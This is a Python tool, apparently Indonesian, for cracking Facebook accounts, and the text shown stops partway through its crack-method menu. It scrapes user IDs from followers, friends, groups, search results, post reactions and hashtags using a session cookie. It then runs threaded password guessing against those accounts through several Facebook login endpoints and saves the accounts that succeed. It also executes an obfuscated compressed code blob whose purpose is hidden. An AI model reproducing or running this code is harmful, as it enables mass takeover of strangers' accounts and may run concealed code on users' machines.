# update Minggu 4 April 2021
# coded by Aap Afandi
# Mau Ngapain Bro?:v
# Recode? jangan di ganti author nya ajg, dan sertakan sumber!!!:v
# fb me : https://m.facebook.com/Kang.Pacman
import os,sys,re,json,random
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
ok=0
cp=0
die=0
cot=0
live=[]
chek=[]
hitung=""
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()
try:hapus("__pycache__")
except:pass
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n\n[✓] \x1b[1;35mDone Bro\n\x1b[0m[*] \x1b[1;32mLIVE\x1b[0m/\x1b[1;33mCHEK \x1b[0m: \x1b[1;32m{len(ngocok)}\x1b[0m/\x1b[1;33m{len(ismylife)}\x1b[0m")
		if len(ngocok)==0:pass
		else:print("[*] \x1b[1;32mHasil Live Tersimpan Di File : live.txt\x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mHasil Chek Tersimpan Di File : chek.txt")
		exit()
	else:exit("\n\n\x1b[1;31m[!] Tidak Mendapatkan Hasil:(")
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=kueh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"[AapAfandiGanteng]"+c[1])
							print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
	def teangan(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				elif "?refid=" in softek[1]:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				else:
					self.id.append(softek[1]+"[AapAfandiGanteng]"+softek[2])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("[!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} ID",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print("[!] Tekan CTRL + C Jika Ingin Langsung Crack")
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.teangan(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			kontol=input("[?] Url/Id Postingan : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0]
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("[!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"[!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih in["8","08"]:
			while True:
				kontol=input("[?] Hashtag : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
							print(f"[!] Hashtag {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
							print(f"[!] Postingan Dengan Hashtag {kontol} Disembunyikan Karna Melanggar Standar Komunitas Fb");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if "5000" in str(jumlah):
								jumlah-=1
							if jumlah<5001:
								self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["9","09"]:
			tod=open("live.txt","r",encoding="UTF-8").read()
			tOd=open("chek.txt","r",encoding="UTF-8").read()
			if len(tod)==0 or "|" not in tod:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Live")
			else:
				print("\n\x1b[1;32m[Result Live]\n")
				print(tod)
			if len(tOd)==0 or "|" not in tOd:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Chek")
			else:
				print("\n\x1b[1;33m[Result Check]\n")
				print(tOd)
			exit()
		elif pilih=="96":
			print("[*] Silahkan Hubungi WhatsApp Saya 083805812588");os.system("xdg-open http://wa.me/+6283805812588?text=assalamualaikum");input("[*] Enter Untuk Kembali Ke Menu > ");waktu(2);self.menu()
		elif pilih=="97":
			os.system("git pull")
			exit()
		elif pilih=="98":
			try:os.remove("cookie")
			except:os.system("rm cookie")
			exit()
		elif pilih=="99":
			about().tentang_sc()
			self.menu()
		elif pilih in["0","00"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("[!] Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()
	def askk(self):
		njir=input("[?] Ingin Menggunakan Password Manual Y/T : ")
		if njir in(""," "):
			print("[!] Jangan Kosong Bro");self.askk()
		elif njir in("y","Y"):
			print("[*] Contoh : name123,name12345")
			while True:
				pwek=input("[?] Password : ")
				if pwek in(""," "):
					print("[!] Jangan Kosong Bro")
				elif len(pwek)<=5:
					print("[!] Password Minimal 6 Karakter")
				else:
					def xhh(xss=None):
						pilih=input("[?] Pilih : ")
						if pilih in(""," "):
							print("[!] Jangan Kosong Bro");xhh()
						elif pilih in("1","01"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://m.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("4","04"):
							print("[!] Harap Untuk Tidak Menggunakan Vpn/wifi Ketika Menggunakan Metode Ini\n[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						else:
							print("[!] Isi Yang Bener Ajg");xhh()
					print("  -=[ Pilih Metode Crack ]=-")
					print("[1] Metode b-api (Mode Crack Cepat)")
